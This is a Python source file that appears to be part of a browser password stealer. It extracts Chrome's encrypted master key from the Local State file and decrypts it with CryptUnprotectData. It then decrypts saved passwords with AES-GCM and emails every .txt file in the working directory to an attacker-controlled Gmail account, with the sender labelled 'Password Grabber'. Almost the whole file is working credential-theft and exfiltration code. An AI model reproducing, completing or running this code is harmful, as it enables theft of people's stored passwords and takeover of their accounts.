import json
import base64
import win32crypt
from Cryptodome.Cipher import AES
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pathlib import Path
from datetime import datetime

def get_secret_key(PATH_LOCAL_STATE):
    """
    Extracts and decrypts the master key from the local state file.

    Args:
        PATH_LOCAL_STATE (str): Path to the local state file.

    Returns:
        bytes: Decrypted master key.
    """
    with open(PATH_LOCAL_STATE, "rb") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

def decrypt_payload(cipher, payload):
    """
    Decrypts the given payload using the provided cipher.

    Args:
        cipher (AES): AES cipher object.
        payload (bytes): Encrypted data.

    Returns:
        bytes: Decrypted data.
    """
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    """
    Generates an AES cipher object using the provided key and initialization vector (IV).

    Args:
        aes_key (bytes): AES key.
        iv (bytes): Initialization vector.

    Returns:
        AES: AES cipher object.
    """
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    """
    Decrypts the password from the given buffer using the master key.

    Args:
        buff (bytes): Encrypted password buffer.
        master_key (bytes): Decrypted master key.

    Returns:
        str: Decrypted password or an error message.
    """
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        print(str(e))
        return "Chrome < 80"

def send_email(uname, email, password):
    """
    Sends an email with the specified username and attached text files.

    Args:
        uname (str): Username to include in the email subject.

    Returns:
        None
    """
    date = datetime.now().strftime("%d/%m/%Y %H:%M")

    email_sender = email
    email_sender_password = password
    email_receiver = email

    smtp_port = 587
    smtp_server = "smtp.gmail.com"

    subject = f"{uname} passwords, {date}"

    msg = MIMEMultipart()
    msg['From'] = "Password Grabber"
    msg['To'] = email_receiver
    msg['Subject'] = subject

    files = Path(".").glob('*.txt')
    for file in files:
        with open(file, "rb") as f:
            attachment_pack = MIMEBase('application', 'octet-stream')
            attachment_pack.set_payload(f.read())
            encoders.encode_base64(attachment_pack)
            attachment_pack.add_header("Content-Disposition", "attachment; filename= " + str(file))
            msg.attach(attachment_pack)
    text = msg.as_string()

    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(email_sender, email_sender_password)
    server.sendmail(email_sender, email_receiver, text)
    server.quit()